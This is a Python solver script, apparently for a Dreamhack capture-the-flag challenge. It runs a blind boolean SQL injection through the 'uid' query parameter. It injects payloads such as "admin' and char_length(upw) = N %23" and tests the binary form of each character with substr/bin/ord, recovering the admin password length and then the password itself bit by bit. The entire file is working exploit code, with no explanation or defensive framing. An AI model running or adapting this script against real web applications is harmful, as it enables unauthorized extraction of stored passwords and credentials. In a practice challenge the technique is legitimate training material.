import requests
import sys

class Solver:
    def __init__(self, port: str) -> None:
        self._URL = f"http://host3.dreamhack.games:{port}/?uid="
    
    def _request(self, query: str) -> bool:
        res = requests.get(self._URL + query)
        return res
        
    
    def _sqli(self, query: str) -> requests.Response:
        res = self._request(query)
        return res
    
    def searchLen(self, query_temp: str, max_pw_len : int, min_pw_len : int = 0) -> int:
        for num in range(min_pw_len, max_pw_len + 1):
            query = query_temp.format(val=num)
            
            if "exists" in self._sqli(query=query).text:
                return num
    
    def _find_pw_length(self, user: str, max_pw_len: int = 100) -> int:
        query = f"{user}' and char_length(upw) = {{val}} %23"
        length = self.searchLen(query, max_pw_len)
        
        return length
    
    def _find_FLAG(self, user: str, length: int) -> str:
        FLAG = ""
        for num in range(1, length + 1):
            bit_length = 0
            while True:
                bit_length += 1
                query = f"{user}' and length(bin(ord(substr(upw, {num}, 1)))) = {bit_length} %23"
                if "exists" in self._sqli(query=query).text:
                    break
            
            bit = self._find_bits(num, user, bit_length)
            FLAG += int.to_bytes(int(bit, 2), (bit_length + 7) // 8, "big").decode("utf-8")
        return FLAG
                
                
    def _find_bits(self, idx: int, user: str, bit_length: int) -> str:
        bit = ""
        for num in range(1, bit_length + 1):
            query = f"{user}' and substr(bin(ord(substr(upw, {idx}, 1))), {num}, 1) = '1' %23"
            if "exists" in self._sqli(query=query).text:
                bit += "1"
            else:
                bit += "0"
        return bit
    
    def solve(self):
        pw_len = solver._find_pw_length("admin") # korean 3byte
        print(f'[*]Lengh of admin password is : {pw_len}')
        flag = solver._find_FLAG("admin", pw_len)
        print(f'[*] Flag is : {flag}')
        
if __name__ == "__main__":
    port = sys.argv[1]

    solver = Solver(port=port)
    solver.solve()